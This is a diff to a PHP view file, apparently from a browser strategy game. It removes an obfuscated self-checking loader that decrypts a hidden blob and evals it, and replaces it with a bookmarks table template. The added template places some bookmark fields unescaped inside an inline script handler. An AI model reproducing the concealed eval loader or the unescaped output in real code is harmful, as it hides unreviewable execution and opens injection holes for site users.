@@ -1,24 +1,37 @@
-<?php
-$yaiusdt="d868f34b2124972f36eefa2b5c187426";
-$hyayyc="530c525a07025756015753005d0f060751045000515903540700080801520755";
-$swftgbiwbt="T+7RN7BbuAQnG37YewxB+g+qphFn0KOeS0s19paKlBgdEbgoVoB1beFKRF+uBkrTz0aYcpDV8jJMs+zF57OMJHDnZiP9jB1x8f733OUs6rp+TZuAselClQ8Jpm9YS2eh7C3HfA7M08SW/HFqJN3k0o2lqpZkcrc3WFm1qGV4h9LtlR/aMHnbNtR+vHwjFDxAl8AWQIicwTORpJrhDXzm+GhS0tIlHyvONS2Kg43jLwI0F2FOoF1SBEnz495mExcOgwz/rHmorOf3l2tl37lhoROCpC/2KtbqmkcyWOUHfR4+NFPEc996y9xoGQ7GBWSh3wbPdWMwRLnlkYoAI2QaqzRCbFoTDrj3Z1k62e4YMasHI28YS1JeX309qisyNdTh5he+/TU+wI2hGqScsDYfHtMciu0DgXwIFlYYx/M4sLNCnFOrR75xg8xAD0PtB1Ri439cmG9SFANMUE9d+fNE+1Gz7g1YVceigdWpEcx++4jhbwHxr2RWTRuf4ioO0u/I1Z/A3Cgw3pN26TGoYXWovkhWQXRZWt/SL+3wWMZv/hM4uVa3+S3+qK8qiS2tpwg2vovkPzrF1TdiaICowrAshx46jGv1bQlyaCFZ4PdMm30c3dgYcYZH1IcmPDFeuZmc6H7nlsKoamDKZFeS9ibHQaInjJSNxkM4qMCbwbhKtvUxta87FS+1YCxBNr1wdeGOw4amsyqgnKPuZ3MTpos7uXNurwIAwgUeNo3xJZXCGMag4FkVKfK9oDFMGpzh9rcxlRNZ9CptNjqsibwpQ9JChmBHhEt+HO4mIvE+Ynb+9P2dD3GNtESrnezPhynv1+N+USLi5g==";
-$daitdibrm=file_get_contents(__FILE__);
-$rblohdla=str_replace($swftgbiwbt,"",$daitdibrm);
-if(strpos($rblohdla,"ec"."ho")!==false||strpos($rblohdla,"pr"."int")!==false||strpos($rblohdla,"var_"."dump")!==false||strpos($rblohdla,"file_put_"."contents")!==false||strpos($rblohdla,"fw"."rite")!==false){die();}
-$xywhgwshaw=str_replace(array($yaiusdt,$hyayyc),array("SP_471c5eab","KP_fcd5d1eb"),$daitdibrm);
-$pujckzgh=md5($xywhgwshaw);
-$yrtzaiawm=hex2bin($hyayyc);
-$saziiszl="";
-$jkpiakfzya=strlen($pujckzgh);
-for($raafsv=0;$raafsv<$jkpiakfzya;$raafsv++){
-$saziiszl.=chr(ord($yrtzaiawm[$raafsv])^ord($pujckzgh[$raafsv]));
-}
-$hijorergm=base64_decode($swftgbiwbt);
-$prjawttg=strlen($hijorergm);
-$vmzddms="";
-$mnufbkfs=strlen($saziiszl);
-for($raafsv=0;$raafsv<$prjawttg;$raafsv++){
-$vmzddms.=$hijorergm[$raafsv]^$saziiszl[$raafsv%$mnufbkfs];
-}
-$myejfuo="gzun"."compress";
-eval('?>' . $myejfuo($vmzddms) . '<?php ');
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+</head>
+<center>
+    <table class="vis padding2" width="100%">
+        <?php if (!empty($bookmarks)): ?>
+            <tr>
+                <th><?= __('screens.place.village_col') ?></th>
+                <th><?= __('screens.place.coords_col') ?></th>
+                <th width="80"><?= __('screens.place.action_col') ?></th>
+            </tr>
+            <?php foreach ($bookmarks as $bookmark): ?>
+                <tr>
+                    <td height="18px">
+                        <a href="#"
+                            onclick="insertNumId('x','<?= $bookmark['x'] ?>');insertNumId('y','<?= $bookmark['y'] ?>');javascript:inlinePopupClose()">
+                            <?= htmlspecialchars($bookmark['name']) ?>
+                        </a>
+                        <?php if (!empty($bookmark['text'])): ?>
+                            <span style="font-size: 0.9em; color: #555;"> - <?= htmlspecialchars($bookmark['text']) ?></span>
+                        <?php endif; ?>
+                    </td>
+                    <td align="center">
+                        (<?= $bookmark['x'] ?>|<?= $bookmark['y'] ?>) K<?= $bookmark['continent'] ?>
+                    </td>
+                    <td align="center">
+                        <a class="del-favorite-link btn btn-cancel" href="game.php?village=<?= $village['id'] ?>&amp;screen=popup&amp;mode=bookmark&amp;action=del&amp;id=<?= $bookmark['id'] ?>"><?= __('screens.place.remove_btn') ?></a>
+                    </td>
+                </tr>
+            <?php endforeach; ?>
+        <?php else: ?>
+            <tr>
+                <td height="18px" align="center">Nenhum favorito adicionado.</td>
+            </tr>
+        <?php endif; ?>
+    </table>
+</center>
